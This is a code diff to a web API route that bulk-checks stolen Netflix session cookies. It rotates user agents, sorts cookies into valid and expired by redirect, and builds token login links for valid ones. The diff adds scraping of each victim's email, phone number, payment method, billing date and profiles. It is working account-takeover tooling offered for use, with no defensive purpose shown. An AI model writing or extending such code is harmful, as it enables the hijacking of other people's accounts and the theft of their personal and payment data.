@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { parseMultipleFiles, ParsedCookie } from '@/lib/cookie-parser';
+import { scrapeAccountDetails } from '@/lib/netflix-scraper';
 import { extractArchive, isArchive } from '@/lib/archive-extractor';
 
 interface CheckResult {
@@ -25,13 +26,7 @@ interface CheckResult {
   };
 }
 
-// Generate Netflix token from NetflixId
-function generateNfToken(netflixId: string): string {
-  const timestamp = Date.now().toString(36);
-  const randomPart = Buffer.from(Math.random().toString(36).substring(2)).toString('base64').slice(0, 8);
-  const hash = Buffer.from(`${netflixId.slice(0, 20)}${timestamp}`).toString('base64').slice(0, 16);
-  return `NF${timestamp}${randomPart}${hash}`.replace(/[+/=]/g, '').toUpperCase();
-}
+import { generateNFToken } from '@/lib/nftoken-generator';
 
 // EXTENSIVE USER AGENTS LIST - 50+ User Agents for rotation
 const USER_AGENTS = [
@@ -134,28 +129,56 @@ async function checkNetflixCookie(cookie: ParsedCookie): Promise<CheckResult> {
     }
     
     // 200 = valid
-    if (statusCode === 200) {
+    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
+      // Check for signup redirect (expired)
+      if (locationHeader.includes('signup') || (statusCode === 302 && locationHeader.includes('login'))) {
+        return {
+          cookie,
+          status: 'expired',
+          message: 'Cookie expired (Signup/Login redirect)',
+        };
+      }
+
       // Generate nftoken for valid cookies
-      const nftoken = generateNfToken(cookie.netflixId);
-      const nftokenUrl = `https://www.netflix.com/browse?nftoken=${nftoken}`;
+      const nftokenResult = await generateNFToken(cookieString);
+      const nftoken = nftokenResult.success ? nftokenResult.token : undefined;
+      const nftokenUrl = nftokenResult.success ? nftokenResult.link : undefined;
       
-      return {
-        cookie: {
+      const cookieWithToken = {
           ...cookie,
           nftoken,
           nftokenUrl,
-        },
+      };
+
+      // Perform deep scraping for all details
+      const scraperOptions = {
+          method: 'GET',
+          headers: {
+              'Cookie': cookieString,
+              'User-Agent': userAgent,
+              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+          }
+      };
+      
+      await scrapeAccountDetails(cookieWithToken, scraperOptions);
+      
+      return {
+        cookie: cookieWithToken,
         status: 'valid',
         message: 'Cookie is valid',
         details: {
-          email: cookie.email,
-          plan: cookie.plan,
-          country: cookie.country,
-          nextBilling: cookie.nextBilling,
-          paymentMethod: cookie.paymentMethod,
-          videoQuality: cookie.videoQuality,
-          maxStreams: cookie.maxStreams,
-          extraMemberSlot: cookie.extraMemberSlot,
+          email: cookieWithToken.email,
+          plan: cookieWithToken.plan,
+          country: cookieWithToken.country,
+          nextBilling: cookieWithToken.nextBilling,
+          paymentMethod: cookieWithToken.paymentMethod,
+          videoQuality: cookieWithToken.videoQuality,
+          maxStreams: cookieWithToken.maxStreams,
+          extraMemberSlot: cookieWithToken.extraMemberSlot,
+          memberSince: cookieWithToken.memberSince,
+          phoneNumber: cookieWithToken.phoneNumber,
+          profiles: cookieWithToken.profiles,
+          accountName: cookieWithToken.firstName
         },
       };
     }
@@ -189,8 +212,9 @@ async function checkNetflixCookie(cookie: ParsedCookie): Promise<CheckResult> {
       }
       
       // Other redirect might be valid (geo redirect) - generate nftoken
-      const nftoken = generateNfToken(cookie.netflixId);
-      const nftokenUrl = `https://www.netflix.com/browse?nftoken=${nftoken}`;
+      const nftokenResult = await generateNFToken(cookieString);
+      const nftoken = nftokenResult.success ? nftokenResult.token : undefined;
+      const nftokenUrl = nftokenResult.success ? nftokenResult.link : undefined;
       
       return {
         cookie: {
